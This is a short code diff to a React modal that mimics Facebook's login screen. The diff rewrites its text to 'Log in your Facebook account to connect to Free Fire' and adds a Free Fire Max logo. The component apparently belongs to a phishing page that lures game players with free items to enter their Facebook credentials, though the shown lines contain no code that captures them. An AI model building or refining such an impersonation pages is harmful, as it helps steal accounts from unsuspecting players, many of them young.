@@ -151,7 +151,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                   facebook
                 </h1>
                 <p className="text-[24px] text-gray-700 mt-2" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
-                  Connect with friends and the world around you on Facebook.
+                  Log in your Facebook account to connect to Free Fire.
                 </p>
               </div>
 
@@ -170,9 +170,9 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                 {item && (
                   <div className="text-center space-y-2 mb-6">
                     <img 
-                      src={item.image_url} 
-                      alt={item.name}
-                      className="w-16 h-16 mx-auto rounded-lg object-cover"
+                      src="/lovable-uploads/ac0404fb-3013-45c8-ad12-1276cfa0a853.png" 
+                      alt="Free Fire Max Logo"
+                      className="w-16 h-16 mx-auto object-contain"
                     />
                     <h3 className="font-semibold text-gray-900">{item.name}</h3>
                     <p className="text-sm text-gray-600">
